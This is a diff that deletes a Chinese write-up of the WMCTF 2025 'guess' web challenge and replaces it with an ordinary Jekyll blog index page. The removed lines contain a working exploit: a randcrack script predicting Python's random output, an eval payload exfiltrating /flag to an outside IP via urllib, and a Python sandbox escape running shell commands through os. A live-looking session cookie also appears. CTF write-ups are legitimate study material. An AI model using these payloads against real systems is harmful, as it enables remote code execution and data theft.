@@ -1,119 +1,94 @@
-# WMCTF 2025 Web WP
-## guess WP
-### 首先，这个题目注册登录谁都会，所以我们直接看关键代码：
-```python
-import random
+---
+layout: page
+title: Blog
+permalink: /blog/
+---
 
-rd = random.Random() // 关键点1
+<section class="blog-explorer">
+  <header class="blog-explorer__hero">
+    <p>把所有写过的内容整理在一起，快速预览主题和亮点，点开即可查看完整细节。</p>
+    <label class="blog-search">
+      <span class="blog-search__label">搜索文章</span>
+      <input id="blog-search-input" type="search" placeholder="按标题、关键字过滤…" autocomplete="off">
+    </label>
+  </header>
 
+  <div class="blog-explorer__list">
+    {% assign posts_by_date = site.posts %}
+    {% if posts_by_date == empty %}
+      <p class="blog-explorer__empty">暂时还没有文章，稍后再来看看吧。</p>
+    {% else %}
+      {% for post in posts_by_date %}
+        {% assign content_id = 'post-' | append: forloop.index0 %}
+        <article class="blog-card" data-post>
+          <header class="blog-card__header">
+            <div>
+              <p class="blog-card__date">{{ post.date | date: "%Y-%m-%d" }}</p>
+              <h2 class="blog-card__title">{{ post.title }}</h2>
+            </div>
+            <div class="blog-card__meta">
+              {% if post.categories.size > 0 %}
+                <span class="blog-card__chip">{{ post.categories | join: ' / ' }}</span>
+              {% endif %}
+              {% if post.tags %}
+                <span class="blog-card__chip blog-card__chip--ghost">{{ post.tags | join: ' · ' }}</span>
+              {% endif %}
+            </div>
+          </header>
 
-@app.post('/api')
-def protected_api():
+          <p class="blog-card__excerpt">
+            {{ post.excerpt | strip_html | truncatewords: 42 }}
+          </p>
 
-    data = request.get_json()
+          <div class="blog-card__actions">
+            <a class="blog-card__link" href="{{ post.url | relative_url }}" target="_blank" rel="noopener">
+              新窗口阅读
+            </a>
+            <button class="blog-card__toggle" type="button" aria-expanded="false" aria-controls="{{ content_id }}" data-target="{{ content_id }}">
+              展开全文
+            </button>
+          </div>
 
-    key1 = data.get('key')
-    
-    if not key1:
-        return jsonify({'error': 'key are required'}), 400
+          <div class="blog-card__full" id="{{ content_id }}" hidden>
+            {{ post.content }}
+          </div>
+        </article>
+      {% endfor %}
+    {% endif %}
+  </div>
+</section>
 
-    key2 = generate_random_string()
-    
-    if not str(key1) == str(key2):
-        return jsonify({
-            'message': 'Not Allowed:' + str(key2) ,
-        }), 403
-    
+<script>
+  window.addEventListener('DOMContentLoaded', () => {
+    const searchInput = document.getElementById('blog-search-input');
+    const cards = Array.from(document.querySelectorAll('[data-post]'));
 
-    payload = data.get('payload')
+    function toggleCard(button) {
+      const target = document.getElementById(button.dataset.target);
+      if (!target) { return; }
+      const expanded = button.getAttribute('aria-expanded') === 'true';
+      button.setAttribute('aria-expanded', String(!expanded));
+      button.textContent = expanded ? '展开全文' : '收起全文';
+      target.hidden = expanded;
+    }
 
-    if payload:
-        eval(payload, {'__builtin__':{}})  // 关键点2
-    
-    return jsonify({
-        'message': 'Access granted',
-    })
+    cards.forEach((card) => {
+      const button = card.querySelector('.blog-card__toggle');
+      if (button) {
+        button.addEventListener('click', () => toggleCard(button));
+      }
+    });
 
-```
-
-### 预测随机数
-如代码所示，这里使用的是random库的random函数，这个函数的算法实际上是梅森旋转算法，根据前随机生成的624个数字可以预测下一个数字，所以这里我们第一步需要破解随机数
-py脚本如下：
-```python
-import requests, re
-from randcrack import RandCrack
-
-url = "http://49.232.42.74:32328/api"
-session = "eyJ1c2VyX2lkIjoiMzM5NTYxNzk0MyIsInVzZXJuYW1lIjoiYWRtaW4ifQ.aM62Kg.XvLwMeAsN6Bx2n66X2JejxJZR1E"
-
-with open("number.txt", 'w') as f:
-    f.write('')
-
-for _ in range(624):
-    response = requests.post(url, headers={'Cookie': session}, 
-                             json={"key":123, "payload": 123}, timeout=10)
-    msg = response.json().get('message', '')
-    match = re.search(r':(\d+)', msg)
-    number = match.group(1)
-    print(msg, number)
-    with open("number.txt", 'a+') as f:
-        f.write(number)
-        f.write("\n")
-
-rc = RandCrack()
-
-numbers = []
-with open("number.txt", 'r') as f:
-    numbers = [int(line.strip()) for line in f.readlines()]
-
-for number in numbers:
-    rc.submit(number)
-
-key = rc.predict_getrandbits(32)
-print(key)
-
-response = requests.post(url, 
-                         headers={'Cookie': session}, 
-                         json=
-                         {
-                            "key":key,
-                            "payload": """__import__('urllib').request.urlopen("http://47.95.170.101:9999/upload?msg=1"+open('/flag','r').read())"""
-                         },
-                         timeout=10)
-for i in range(5):
-    key = rc.predict_getrandbits(32)
-    print(key)
-print(response.content)
-```
-### 构造payload命令
-这个脚本首先的作用是发送624次请求，然后获取返回的key2，也就是生成的随机数，然后预测下一次生成的随机数，匹配成功后就可以注入代码，上面的网页代码中虽然做了过滤，但是实际上是一个无用的过滤，因为py3已经不适用__builtin__
-
-这里我们构造的命令注入代码是这样的：
-
-```python
-__import__('urllib').request.urlopen("http://外部服务器url/upload?msg=1"+open('/flag','r').read())
-```
-先读取flag的内容，然后使用python的urllib库函数发送request到服务器上接收，接着到外部服务器上直接读取flag。这是在出网的前提下才能适用的做法，下面介绍一种不出网的做法：
-
-这个题目由于权限问题，在使用数据外带的方法之前，尝试过各种方法，比如将flag直接写入同级目录下、404污染、将flag写入login.html文件下等方法，均失败。
-
-首先，构造出可执行系统命令的lamda函数，然后创建static静态文件夹，再将flag写入static文件夹下，之后直接访问flag文件就可以了。
-payload如下：
-```python
-(lambda o: 
-    [
-        o.mkdir('static'), 
-        open('static/flag','w').write(o.popen('tac /flag').read())
-    ]
-)(next(
-    c.__init__.__globals__['os'] 
-    for c in ().__class__.__base__.__subclasses__() 
-    if hasattr(c.__init__,'__globals__') 
-    and 'os' in c.__init__.__globals__
-))
-```
-
-
-
-
-
+    if (searchInput) {
+      const normalize = (text) => text.toLowerCase().replace(/\s+/g, ' ').trim();
+      searchInput.addEventListener('input', (event) => {
+        const keyword = normalize(event.target.value);
+        cards.forEach((card) => {
+          const text = normalize(card.textContent || '');
+          const match = !keyword || text.includes(keyword);
+          card.style.display = match ? '' : 'none';
+        });
+      });
+    }
+  });
+</script>
